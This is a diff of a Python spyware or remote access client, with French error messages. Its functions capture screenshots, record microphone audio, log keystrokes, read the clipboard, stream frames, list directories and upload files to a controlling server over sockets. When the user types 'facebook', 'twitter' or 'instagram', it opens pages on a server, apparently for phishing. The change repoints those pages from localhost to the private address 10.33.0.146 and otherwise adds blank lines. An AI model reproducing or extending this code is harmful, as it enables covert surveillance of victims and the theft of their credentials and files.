@@ -15,11 +15,12 @@ from pynput.keyboard import Key, Listener
 
 current_keys = []
 trigger_words = {
-    'facebook': 'https://127.0.0.1:5000/facebook',
-    'twitter': 'https://127.0.0.1:5000/twitter',
-    'instagram': 'https://127.0.0.1:5000/instagram'
+    'facebook': 'https://10.33.0.146:5000/facebook',
+    'twitter': 'https://10.33.0.146:5000/twitter',
+    'instagram': 'https://10.33.0.146:5000/instagram'
 }
 page_opened_recently = False  # Flag to control page opening
+
 
 def take_and_send_screenshot(sio, user_id):
     try:
@@ -35,6 +36,7 @@ def take_and_send_screenshot(sio, user_id):
         print(f"Échec de la capture d'écran: {e}")
         pass
 
+
 def resize_image(image_bytes_io, base_width=1300):
     img = Image.open(image_bytes_io)
     w_percent = (base_width / float(img.size[0]))
@@ -43,6 +45,7 @@ def resize_image(image_bytes_io, base_width=1300):
     img_byte_arr = io.BytesIO()
     img.save(img_byte_arr, format='PNG')
     return img_byte_arr
+
 
 def record_and_send_audio(duration=10, sio=None, user_id=None):
     try:
@@ -68,12 +71,14 @@ def record_and_send_audio(duration=10, sio=None, user_id=None):
         print(f"Échec de l'enregistrement audio: {e}")
         pass
 
+
 def save_wave_file(file_io, audio_data):
     with wave.open(file_io, 'wb') as wave_file:
         wave_file.setnchannels(1)
         wave_file.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
         wave_file.setframerate(44100)
         wave_file.writeframes(audio_data)
+
 
 def record_and_send_keyboard_log(duration=10, sio=None, user_id=None):
     try:
@@ -88,6 +93,7 @@ def record_and_send_keyboard_log(duration=10, sio=None, user_id=None):
     except Exception as e:
         print(f"Échec de l'enregistrement du keylogger: {e}")
         pass
+
 
 def get_clipboard_content(sio=None, user_id=None):
     try:
@@ -138,6 +144,7 @@ def gen_frames(sio, reconnect_attempts=5, reconnect_delay=2):
             print("Max reconnection attempts reached. Exiting.")
             break
 
+
 def download_file(file_path, sio, user_id):
     try:
         if os.path.exists(file_path):
@@ -151,6 +158,7 @@ def download_file(file_path, sio, user_id):
             print("Fichier introuvable")
     except Exception as e:
         print(f"Échec de l'envoi du fichier: {e}")
+
 
 def list_dir(dir_path, sio):
     files_and_dirs = []
@@ -199,11 +207,13 @@ def on_press(key):
                 page_opened_recently = True  # Set the flag to True
                 break
 
+
 def on_release(key):
     global page_opened_recently
     if key == Key.esc:
         return False  # Stop listening if the escape key is pressed
     page_opened_recently = False  # Reset the flag on key release
+
 
 def start_listener():
     with Listener(on_press=on_press, on_release=on_release) as listener:
